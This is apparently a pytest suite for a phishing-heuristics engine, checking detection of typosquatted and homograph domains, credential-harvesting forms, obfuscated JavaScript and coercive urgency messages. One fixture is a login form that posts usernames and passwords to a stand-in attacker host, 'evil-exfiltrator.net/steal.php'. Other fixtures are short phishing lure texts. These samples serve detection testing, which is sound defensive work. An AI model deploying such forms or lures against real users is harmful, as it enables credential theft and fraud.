"""
Comprehensive Test Suite for Phase 2: Threat & Phishing Heuristics Engine.
Covers typosquatting, IDN homographs, DOM credential harvesting, and deceptive urgency NLP.
"""

from engine.threat.homograph_typosquatting import (
    audit_domain_threats,
    calculate_shannon_entropy,
    levenshtein_distance,
)
from engine.threat.dom_harvesting import audit_dom_credential_harvesting
from engine.threat.social_engineering_nlp import audit_social_engineering_text


# -------------------------------------------------------------
# Tests 1 - 3: Levenshtein Distance & Entropy Mechanics
# -------------------------------------------------------------
def test_levenshtein_distance_calculation():
    """Verifies edit distance between brands and typosquats."""
    assert levenshtein_distance("paypal", "paypa1") == 1
    assert levenshtein_distance("google", "g00gle") == 2
    assert levenshtein_distance("sbi", "sbi") == 0


def test_shannon_entropy_calculation():
    """Verifies that high-randomness strings produce elevated entropy."""
    low_entropy = calculate_shannon_entropy("google")
    high_entropy = calculate_shannon_entropy("x8q9z2k7w4m1p0")
    assert high_entropy > low_entropy


# -------------------------------------------------------------
# Tests 4 - 8: Brand Typosquatting & Impersonation
# -------------------------------------------------------------
def test_paypal_typosquat_detected():
    """Detects paypa1.com as a distance-1 impersonation of PayPal."""
    res = audit_domain_threats("https://paypa1-secure.com/login")
    assert res.is_typosquatted is True
    assert res.impersonated_brand == "paypal"
    assert res.severity == "CRITICAL"


def test_sbi_banking_deceptive_tokens():
    """Detects sbi combined with deceptive token 'kyc'."""
    res = audit_domain_threats("sbi-kyc-update.in")
    assert res.is_typosquatted is True
    assert res.impersonated_brand == "sbi"
    assert "kyc" in res.deceptive_tokens
    assert res.severity == "CRITICAL"


def test_clean_domain_not_flagged():
    """Legitimate domains like example.com or python.org pass cleanly."""
    res = audit_domain_threats("https://python.org/downloads")
    assert res.is_typosquatted is False
    assert res.threat_detected is False
    assert res.severity == "SAFE"


def test_known_url_shortener_flagged():
    """Known URL shorteners like weurl.co and bit.ly are flagged as SUSPICIOUS."""
    res = audit_domain_threats("https://weurl.co/NINJAC/05DDMU")
    assert res.is_shortener is True
    assert res.severity == "SUSPICIOUS"


def test_punycode_homograph_flagged():
    """Detects xn-- Cyrillic homograph lookalike domains."""
    res = audit_domain_threats("https://xn--pple-43d.com")
    assert res.is_homograph is True
    assert res.severity == "CRITICAL"


# -------------------------------------------------------------
# Tests 9 - 13: DOM Credential Harvesting & Obfuscated JS
# -------------------------------------------------------------
def test_cross_origin_form_harvesting_detected():
    """Flags forms on domainA posting passwords to a foreign domainB."""
    html = """
    <html>
      <body>
        <h2>Login to Portal</h2>
        <form action="https://evil-exfiltrator.net/steal.php" method="POST">
          <input type="text" name="username" placeholder="Username">
          <input type="password" name="password" placeholder="Password">
          <button type="submit">Log In</button>
        </form>
      </body>
    </html>
    """
    res = audit_dom_credential_harvesting(html, current_origin="https://portal-support.com")
    assert res.harvesting_detected is True
    assert res.has_password_field is True
    assert res.cross_origin_submission is True
    assert res.severity == "CRITICAL"


def test_clean_same_origin_form_safe():
    """Same-origin form submissions with password input have lower severity."""
    html = """
    <form action="/login" method="POST">
      <input type="password" name="password">
    </form>
    """
    res = audit_dom_credential_harvesting(html, current_origin="https://example.com")
    assert res.cross_origin_submission is False
    assert res.has_password_field is True
    assert res.severity == "SUSPICIOUS"


def test_obfuscated_js_detected():
    """Detects eval(unescape(...)) evasive scripts."""
    html = """
    <script>
      eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65'));
    </script>
    """
    res = audit_dom_credential_harvesting(html, current_origin="https://example.com")
    assert res.obfuscated_js is True
    assert "eval_unescape_or_atob" in res.obfuscation_indicators


# -------------------------------------------------------------
# Tests 14 - 16: Social Engineering Deceptive Urgency NLP
# -------------------------------------------------------------
def test_account_suspension_urgency_detected():
    """Detects psychological coercion and 24h deadline threats."""
    text = "Important notice: Your account will be suspended within 24 hours. Immediate action required!"
    res = audit_social_engineering_text(text)
    assert res.is_coercive is True
    assert "account_suspension" in res.detected_categories
    assert res.urgency_score >= 50


def test_fake_kyc_and_recharge_detected():
    """Detects mandatory KYC updates and fake recharge lures."""
    text = "Dear customer, your mandatory KYC update is pending or your SIM card will be deactivated. Claim free recharge."
    res = audit_social_engineering_text(text)
    assert "fake_kyc_and_compliance" in res.detected_categories
    assert "fake_reward_and_recharge" in res.detected_categories
    assert res.severity in ("CRITICAL", "SUSPICIOUS")


def test_normal_educational_text_safe():
    """Normal conversational text produces 0 urgency score."""
    text = "Welcome to our documentation portal. Here you can read about our API endpoints and SDKs."
    res = audit_social_engineering_text(text)
    assert res.urgency_score == 0
    assert res.is_coercive is False
    assert res.severity == "SAFE"
